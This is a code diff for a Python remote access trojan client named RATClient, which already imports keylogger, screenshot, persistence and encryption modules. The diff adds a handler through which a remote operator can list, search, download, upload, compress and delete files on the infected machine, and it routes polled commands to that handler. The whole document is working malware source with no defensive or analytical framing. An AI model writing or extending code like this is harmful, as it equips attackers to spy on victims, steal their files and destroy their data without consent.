@@ -8,6 +8,7 @@ from encryptor import Encryptor
 from persistence import PersistenceManager
 from protocol import Protocol
 from process_manager import ProcessManager
+from file_manager import FileManager
 from keylogger import Keylogger
 from screenshotManager import take_screenshot, ScreenshotManager
 from System_info import SystemInfo
@@ -20,6 +21,7 @@ class RATClient:
         self.id_manager = ClientIdentityManager()
         self.persistence = PersistenceManager()
         self.process_manager = ProcessManager()
+        self.file_manager = FileManager()
 
 
         self.client_id = self.id_manager._get_persistent_client_id()
@@ -221,6 +223,53 @@ class RATClient:
             return {"error": f"Process command failed: {e}"}
     
     
+    def handle_file_command(self, command_data):
+        try:
+            action = command_data.get("action")
+            data = command_data.get("data", {})
+            
+            if action.startswith("file_"):
+                action = action[5:]
+            
+            if action == "list_directory":
+                path = data.get("path", '.')
+                result = self.file_manager.list_directory(path)
+            elif action == "download_chunk":
+                result = self.file_manager.download_file_chunk(
+                    data.get("file_path"),
+                    data.get("chunk_index", 0)
+                )
+            elif action == "upload_chunk":
+                result = self.file_manager.upload_file_chunk(
+                    data.get("file_path"),
+                    data.get('chunk_data'),
+                    data.get('chunk_index', 0),
+                    data.get('is_last', False)
+                )
+            elif action == "search_files":
+                result = self.file_manager.search_files(
+                    data.get("root_path", "."),
+                    data.get("pattern", "*"),
+                    data.get("max_results", 50)
+                )
+            elif action == "compress_files":
+                result = self.file_manager.compress_files(
+                    data.get("files", []),
+                    data.get("output_path")
+                )
+            elif action == "delete_file":
+                result = self.file_manager.delete_file(data.get('file_path'))
+            elif action == "create_directory":
+                result = self.file_manager.create_directory(data.get('dir_path'))
+            else:
+                result = {"error": f"Unknown file action: {action}"}
+
+            return result
+        
+        except Exception as e:
+            return {"error": f"file command failed: {e}"}
+    
+    
     def poll_commands(self):
         try: 
             get_commands_msg = Protocol.create_get_commands_message(self.client_id)
@@ -270,12 +319,19 @@ class RATClient:
             
             print(f"[CLIENT] Executing command {command_id}: {action}")
             
+            # Check if it's a file command
+            if action.startswith("file_"):
+                file_action = action[5:]
+                result = self.handle_file_command({
+                    "action": file_action,
+                    "data": data
+                })
+            else:
+                result = self.handle_process_command({
+                    "action": action,
+                    "data": data
+                })
             
-            
-            result = self.handle_process_command({
-                "action": action,
-                "data": data
-            })
             print(f"[CLIENT] Command {command_id} result: {type(result)}, size: {len(str(result)) if result else 0}")
             
             
